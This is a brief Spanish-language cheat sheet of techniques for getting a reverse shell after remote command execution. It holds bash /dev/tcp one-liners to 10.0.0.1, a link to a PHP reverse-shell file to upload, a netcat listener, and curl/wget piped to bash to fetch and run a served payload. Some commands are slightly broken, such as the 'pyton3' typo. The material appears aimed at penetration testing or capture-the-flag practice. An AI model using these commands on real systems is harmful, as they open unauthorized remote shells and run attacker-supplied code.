
### Técnicas para una reverse shell
#### Consideraciones
* **En ocasiones el PUERTO puede determinar que funcione o no**
* **Si no funciona, probar a cambiar el tipo de comillas "" '' **
* **Si metemos la reverse shell en la URL, mejor URLencodear el comando**.
* **Si metemos la reverse shell a través de un comando con un exploit en el terminal,  poner el comando entre comillas**

#### RCE en la URL con BASH
Si tenemos ejecución remota de comandos a través de una URL, podemos establecer una reverse shell con bash.  Nos ponemos a la escucha y ejecutamos el comando en la URL.

```bash
"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
"bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"
```

#### File upload PHP
Si podemos subir ficheros, una opción es subir un php malicioso con el código de la reverse shell, ponernos a la escucha, y visitar el fichero/url
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

#### RCE con CURL en BASH
En ocasiones el comando en la URL no funciona, pero si ejecuta comandos. Se puede meter el codigo malicioso en un fichero index.html, servir esto con python, y hacer un curl desde la URL (teniendo RCE a través de la URL).

1º- Crear un fichero index.html con el siguiente contenido (una de las 3):
```bash
"bash -i >& /dev/tcp/10.0.0.1/443 0>&1"
'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'
"bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'"
```

2º- Servir con python y ponernos a la escucha con netcat:
```python
pyton3 -m http.server 80
nc -nlvp 443
```

3º - Hacer un curl desde la URL y pipeamos con bash para interpretar el código.
```bash
"curl 'http://ip' | bash"
"wget 'http://ip' | bash"
```
